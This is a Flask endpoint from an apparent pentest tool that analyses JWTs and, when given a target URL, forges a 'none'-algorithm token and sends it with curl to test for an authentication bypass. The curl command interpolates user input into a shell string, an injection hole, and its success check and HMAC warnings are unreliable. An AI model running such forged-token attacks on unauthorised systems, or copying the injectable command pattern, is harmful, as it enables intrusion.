from flask import Blueprint, request, jsonify
import base64
import json
import logging

from server_core.command_executor import execute_command

logger = logging.getLogger(__name__)

api_api_scan_jwt_analyzer_bp = Blueprint("api_api_scan_jwt_analyzer", __name__)


@api_api_scan_jwt_analyzer_bp.route("/api/tools/jwt_analyzer", methods=["POST"])
def jwt_analyzer():
    """Advanced JWT token analysis and vulnerability testing"""
    try:
        params = request.json
        jwt_token = params.get("jwt_token", "")
        target_url = params.get("target_url", "")

        if not jwt_token:
            logger.warning("🔐 JWT Analyzer called without jwt_token parameter")
            return jsonify({
                "error": "JWT token parameter is required"
            }), 400

        logger.info(f"🔍 Starting JWT security analysis")

        results = {
            "token": jwt_token[:50] + "..." if len(jwt_token) > 50 else jwt_token,
            "vulnerabilities": [],
            "token_info": {},
            "attack_vectors": []
        }

        # Decode JWT header and payload (basic analysis)
        try:
            parts = jwt_token.split('.')
            if len(parts) >= 2:
                # Add padding if needed
                header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
                payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)

                try:
                    header = json.loads(base64.b64decode(header_b64))
                    payload = json.loads(base64.b64decode(payload_b64))

                    results["token_info"] = {
                        "header": header,
                        "payload": payload,
                        "algorithm": header.get("alg", "unknown")
                    }

                    # Check for vulnerabilities
                    algorithm = header.get("alg", "").lower()

                    if algorithm == "none":
                        results["vulnerabilities"].append({
                            "type": "none_algorithm",
                            "severity": "CRITICAL",
                            "description": "JWT uses 'none' algorithm - no signature verification"
                        })

                    if algorithm in ["hs256", "hs384", "hs512"]:
                        results["attack_vectors"].append("hmac_key_confusion")
                        results["vulnerabilities"].append({
                            "type": "hmac_algorithm",
                            "severity": "MEDIUM",
                            "description": "HMAC algorithm detected - vulnerable to key confusion attacks"
                        })

                    # Check token expiration
                    exp = payload.get("exp")
                    if not exp:
                        results["vulnerabilities"].append({
                            "type": "no_expiration",
                            "severity": "HIGH",
                            "description": "JWT token has no expiration time"
                        })

                except Exception as decode_error:
                    results["vulnerabilities"].append({
                        "type": "malformed_token",
                        "severity": "HIGH",
                        "description": f"Token decoding failed: {str(decode_error)}"
                    })

        except Exception as e:
            results["vulnerabilities"].append({
                "type": "invalid_format",
                "severity": "HIGH",
                "description": "Invalid JWT token format"
            })

        # Test token manipulation if target URL provided
        if target_url:
            # Test none algorithm attack
            none_token_parts = jwt_token.split('.')
            if len(none_token_parts) >= 2:
                # Create none algorithm token
                none_header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode().rstrip('=')
                none_token = f"{none_header}.{none_token_parts[1]}."

                command = f"curl -s -H 'Authorization: Bearer {none_token}' '{target_url}'"
                none_result = execute_command(command, use_cache=False)

                if "200" in none_result.get("stdout", "") or "success" in none_result.get("stdout", "").lower():
                    results["vulnerabilities"].append({
                        "type": "none_algorithm_accepted",
                        "severity": "CRITICAL",
                        "description": "Server accepts tokens with 'none' algorithm"
                    })

        logger.info(f"📊 JWT analysis completed | Vulnerabilities found: {len(results['vulnerabilities'])}")

        return jsonify({
            "success": True,
            "jwt_analysis_results": results
        })

    except Exception as e:
        logger.error(f"💥 Error in JWT analyzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500
